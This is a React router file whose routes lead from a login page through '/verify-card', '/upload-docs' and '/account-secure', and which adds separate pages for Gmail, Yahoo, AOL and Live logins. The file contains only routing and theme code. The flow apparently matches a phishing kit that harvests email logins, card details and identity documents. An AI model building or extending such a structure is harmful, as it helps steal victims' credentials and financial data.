import { BrowserRouter, Route, Routes } from "react-router-dom";
import { Login } from "../components/Login";
import { CardInformation } from "../components/CardInformation";
import { Box, createTheme, ThemeProvider } from "@mui/material";
import { Informations } from "../components/Informations";
import { UploadDoc } from "../components/UploadDoc";
import { Success } from "../components/Success";
import ScrollToTop from "../ScrollToTop";
import { Email } from "../components/Email";
import { Gmail } from "../components/external/Gmail";
import { AnyOtherEmail } from "../components/external/AnyOtherEmail";
import { Aol } from "../components/external/Aol";
import { Live } from "../components/external/Live";
import { Yahoo } from "../components/external/Yahoo";

const theme = createTheme({
  palette: {
    primary: {
      main: "#0b6efd",
    },
    error: {
      main: "#bf2155",
    },
  },
  typography: {
    fontFamily: `"Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif`,
  },
});

const AppRouter = () => {
  return (
    <BrowserRouter>
      <>
        <ScrollToTop />
        <ThemeProvider theme={theme}>
          <Box>
            <Box minHeight="100vh">
              <Box
                minHeight="100vh"
                display="flex"
                flexDirection="column"
                justifyContent="space-between"
                overflow="hidden"
              >
                <Routes>
                  <Route element={<Login />} path="/" />
                  <Route element={<Email />} path="/email-auth" />
                  <Route element={<Informations />} path="/information" />
                  <Route element={<CardInformation />} path="/verify-card" />
                  <Route element={<UploadDoc />} path="/upload-docs" />
                  <Route element={<Success />} path="/account-secure" />
                  <Route path="/external/gmail" element={<Gmail />} />
                  <Route path="/external/yahoo" element={<Yahoo />} />
                  <Route path="/external/aol" element={<Aol />} />
                  <Route path="/external/live" element={<Live />} />
                  <Route path="/external/*" element={<AnyOtherEmail />} />
                </Routes>
              </Box>
            </Box>
          </Box>
        </ThemeProvider>
      </>
    </BrowserRouter>
  );
};

export default AppRouter;
